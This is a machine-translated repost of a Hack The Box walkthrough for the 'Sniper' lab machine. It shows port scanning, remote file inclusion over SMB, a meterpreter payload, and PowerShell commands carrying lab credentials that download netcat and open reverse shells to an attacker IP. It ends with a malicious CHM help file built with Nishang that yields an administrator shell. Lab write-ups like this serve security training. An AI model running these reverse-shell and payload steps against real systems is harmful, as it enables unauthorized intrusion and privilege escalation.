<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üö£üèª üë©üèª‚Äçüîß üõµ Hack The Box. Walkthrough Sniper. RFI and malicious CHM document üòô üßù ‚öíÔ∏è</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="I continue to publish solutions sent for further processing from the HackTheBox site . I hope that this will help at least someone to develop in the f...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Hack The Box. Walkthrough Sniper. RFI and malicious CHM document</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/494616/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/mw/e8/nn/mwe8nn0gz2fm8hgspkwdeho_4ks.png" alt="image"></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
I continue to publish solutions sent for </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">further processing</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> from the </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">HackTheBox</font></a><font style="vertical-align: inherit;"> site </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">I hope that this will help at least someone to develop in the field of information security. </font><font style="vertical-align: inherit;">In this article, we exploit RFI, bypass the shell meterpreter lock and create a malicious CHM document. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Connection to the laboratory is via VPN. </font><font style="vertical-align: inherit;">It is recommended not to connect from a work computer or from a host where the data important to you is available, since you end up on a private network with people who know something in the field of information security :)</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Organizational Information</font></font></b><div class="spoiler_text">  ,    -           ,        :<br>
<br>
<ul>
<li>PWN;</li>
<li> (Crypto);</li>
<li>c  (Network);</li>
<li> (Reverse Engineering);</li>
<li> (Stegano);</li>
<li>   WEB-.</li>
</ul><br>
         ,    ,        ,     .<br>
<a name="habracut"></a><br>
      ,     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=" rel="nofollow">  Telegram</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=" rel="nofollow">    </a>   .    , ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=" rel="nofollow">    </a>.<br>
<br>
      .          ,  -      ,      .<br>
</div></div><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recon</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
This machine has an IP address 10.10.10.151, which I add to / etc / hosts.</font></font><br>
<br>
<pre><code class="plaintext hljs">10.10.10.151    sniper.htb</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
First, we scan open ports. </font><font style="vertical-align: inherit;">Since it takes a long time to scan all the ports with nmap, I will first do this with masscan. </font><font style="vertical-align: inherit;">We scan all TCP and UDP ports from the tun0 interface at a speed of 1000 packets per second.</font></font><br>
<br>
<pre><code class="bash hljs">masscan -e tun0 -p1-65535,U:1-65535 10.10.10.151 --rate=1000</code></pre><br>
<img src="https://habrastorage.org/webt/b0/d-/bc/b0d-bcmgwi39ecmchwum4mpaw9e.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Now, for more detailed information about the services that operate on ports, we will run a scan with the -A option.</font></font><br>
<br>
<pre><code class="bash hljs">nmap -A sniper.htb -p80,135,139,445</code></pre><br>
<img src="https://habrastorage.org/webt/74/gb/lx/74gblxgtomo9vkjxu0kvyf_gfiu.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
There are 4 ports on the host, we find out what the web server can give us. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/pe/pd/52/pepd521x0lma21dqe_cwvyupfws.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
The first three links are empty, but the other two links are on the blog and authorization pages. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/em/pa/ji/empajismbhrjoadfawq41sm42kg.png" alt="image"><br>
<br>
<img src="https://habrastorage.org/webt/qw/i5/gb/qwi5gbtzqf4tdxapfing4lapmgy.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Credentials like admin: admin are not suitable, but the blog page has an interesting choice of language. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/px/0w/yz/px0wyz9zkvqypevr8mwtzong5kw.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Immediately there are thoughts about LFI. </font><font style="vertical-align: inherit;">Let's read one of the files that everyone can read, for example hosts (both on Linux and Windows). </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ul/tg/25/ultg25vu4wroskdf14ewld6s5vy.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
The idea was confirmed, we have LFI.</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Entry point</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
But there is an opportunity to try and RFI. </font><font style="vertical-align: inherit;">Create a test file. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/qh/cd/lg/qhcdlgrcimk0xjdbjvvjfqpxkqe.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Expand the local SMB SAMBA server. </font><font style="vertical-align: inherit;">To do this, we write the appropriate configurations to the file /etc/samba/smb.conf. </font><font style="vertical-align: inherit;">You need to register the path to the directory and give permissions for access on behalf of the guest. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/gw/9v/fy/gw9vfysmkmh4xe8mjae5ponc7ta.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Now run the smbd service.</font></font><br>
<br>
<pre><code class="bash hljs">service smbd start</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
And turning to the resource, we get a positive result. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/rb/hv/hy/rbhvhy5cfqsxuh-wrrayo49zicu.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Now we throw the load. </font><font style="vertical-align: inherit;">Create it using msfvenom, then activate the listener. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ti/c5/i4/tic5i4bdlufa7xxantq3nunvjmo.png" alt="image"><br>
<br>
<img src="https://habrastorage.org/webt/j6/he/6r/j6he6rn0e7ngc6fp7wqfnaxq5am.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
We appeal to the file. </font><font style="vertical-align: inherit;">And we get the connection. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/u7/jy/nt/u7jynt7q9qtojsosfd_giadr-t0.png" alt="image"><br>
<br>
<img src="https://habrastorage.org/webt/04/ya/gj/04yagjyu6n5d2bszdwzbzkxa7ns.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Since the site had an authorization page, we can find at least some credentials. </font><font style="vertical-align: inherit;">We are located in the directory of the blog page. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/6h/qx/h6/6hqxh6wrb78rgtmwvtpqljtyo90.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Let's download everything in the user directory. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/af/0-/zc/af0-zcq7ryzkbzjwwoi4tfmxube.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Later, looking at all the files on the local host, we find the credentials for connecting to the database.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/kl/fh/kk/klfhkkdknyiejpkmxea9-vkhprq.png" alt="image"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">USER</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
We recognize users in the system. </font><font style="vertical-align: inherit;">But when executing any command through the shell in meterpreter, we get a connection break. </font><font style="vertical-align: inherit;">Is cmd blocked? </font><font style="vertical-align: inherit;">Let's try to bypass the lock by creating a powershell process in interactive mode (-i) hidden from view (-H) and passing our command as parameters (-a).</font></font><br>
<br>
<pre><code class="bash hljs">execute -f powershell -a <span class="hljs-string">"net users"</span> -i -H</code></pre><br>
<img src="https://habrastorage.org/webt/a9/qb/lf/a9qblfczpjvqxzgyq0-61e9wpdq.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Now let's try to execute the command in the context of this user. </font><font style="vertical-align: inherit;">To do this, we will pass the following script to powershell as a parameter.</font></font><br>
<br>
<pre><code class="bash hljs">execute -f powershell -a <span class="hljs-string">"<span class="hljs-variable">$username</span> = 'SNIPER\Chris' ; <span class="hljs-variable">$password</span> = '36mEAhz/B8xQ~2VM' ; <span class="hljs-variable">$securePassword</span> = ConvertTo-SecureString <span class="hljs-variable">$password</span> -AsPlainText -Force ; <span class="hljs-variable">$credential</span> = New-Object System.Management.Automation.PSCredential <span class="hljs-variable">$username</span>, <span class="hljs-variable">$securePassword</span> ; Invoke-command -computername SNIPER -credential <span class="hljs-variable">$credential</span> -scriptblock { whoami }"</span> -i -H</code></pre><br>
<img src="https://habrastorage.org/webt/ee/ww/zq/eewwzq3pw5qzd7tvofapblkqnbw.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Download to netcat host. </font><font style="vertical-align: inherit;">To do this, run the HTTP server in the directory with it.</font></font><br>
<br>
<pre><code class="bash hljs">python3 -m http.server 80</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
And complete the download.</font></font><br>
<br>
<pre><code class="bash hljs">execute -f powershell -a <span class="hljs-string">"<span class="hljs-variable">$username</span> = 'SNIPER\Chris' ; <span class="hljs-variable">$password</span> = '36mEAhz/B8xQ~2VM' ; <span class="hljs-variable">$securePassword</span> = ConvertTo-SecureString <span class="hljs-variable">$password</span> -AsPlainText -Force ; <span class="hljs-variable">$credential</span> = New-Object System.Management.Automation.PSCredential <span class="hljs-variable">$username</span>, <span class="hljs-variable">$securePassword</span> ; Invoke-command -computername SNIPER -credential <span class="hljs-variable">$credential</span> -scriptblock { iwr 10.10.15.55/nc -o C:\\Users\\Chris\\Documents\\nc.exe }"</span> -i -H</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Now we start at ourselves netcat, we carry out connection and we receive user session.</font></font><br>
<br>
<pre><code class="bash hljs">execute -f powershell -a <span class="hljs-string">"<span class="hljs-variable">$username</span> = 'SNIPER\Chris' ; <span class="hljs-variable">$password</span> = '36mEAhz/B8xQ~2VM' ; <span class="hljs-variable">$securePassword</span> = ConvertTo-SecureString <span class="hljs-variable">$password</span> -AsPlainText -Force ; <span class="hljs-variable">$credential</span> = New-Object System.Management.Automation.PSCredential <span class="hljs-variable">$username</span>, <span class="hljs-variable">$securePassword</span> ; Invoke-command -computername SNIPER -credential <span class="hljs-variable">$credential</span> -scriptblock { C:\\Users\\Chris\\Documents\\nc.exe -e powershell 10.10.15.55 6543}"</span> -i -H</code></pre><br>
<img src="https://habrastorage.org/webt/oc/db/zb/ocdbzb2elwzdnddhqgiv90ysoqc.png" alt="image"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ROOT</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
After wandering around in user directories, we find a chm file. </font><font style="vertical-align: inherit;">It is not clear why it is needed. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/j8/tn/cz/j8tncz_otbckfqjiaslog6yz9_y.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
On C: drive, a note is left in the Docs folder stating that the user does not know how to work with PHP and must prepare the documentation. </font><font style="vertical-align: inherit;">Leave documents in this folder. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/un/g9/n6/ung9n6uucaywnk1zqzuhcwfp5a8.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Install HTML Help Workshop. </font><font style="vertical-align: inherit;">And then we will generate a malicious CHM file using </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Out-Chm</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> from the Nishang package.</font></font><br>
<br>
<pre><code class="bash hljs">Out-CHM -Payload <span class="hljs-string">"C:\\Users\\Chris\\Documents\\nc.exe -e powershell 10.10.15.55 8765"</span> -HHCPath <span class="hljs-string">"C:\Program Files (x86)\HTML Help Workshop"</span></code></pre><br>
<img src="https://habrastorage.org/webt/ud/bt/pf/udbtpfqzytij8dhktofl-lcyu94.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Now save our file to the target directory on the remote host.</font></font><br>
<br>
<pre><code class="bash hljs">wget http://10.10.15.55/doc.chm -o C:\Docs\doc.chm</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
And we get an administrator session. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/tb/w_/j-/tbw_j-55ept0q_moagi8getiyka.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
You can join us on </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Telegram</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">There you can find interesting materials, merged courses, as well as software. </font><font style="vertical-align: inherit;">Let's put together a community in which there will be people who are versed in many areas of IT, then we can always help each other on any IT and information security issues.</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../en494606/index.html">How to observe the moon and planets</a></li>
<li><a href="../en494608/index.html">Preparing for Ludum Dare</a></li>
<li><a href="../en494610/index.html">Books for beginner podcasters: what to read about earning and monetizing conversational programs</a></li>
<li><a href="../en494612/index.html">Blazor Client Side Online Store: Part 3 - Product Showcase</a></li>
<li><a href="../en494614/index.html">Another look at the question "Do I need defragmentation for SSD"</a></li>
<li><a href="../en494618/index.html">Automatic bar with voice control on arduino</a></li>
<li><a href="../en494620/index.html">How to replace target-action and delegate with closures</a></li>
<li><a href="../en494622/index.html">No masks, but you hold 2/2</a></li>
<li><a href="../en494630/index.html">Install micropython on ESP8266 and work with it under Linux (for beginners)</a></li>
<li><a href="../en494632/index.html">Quartet 9: Allegro | Performance</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>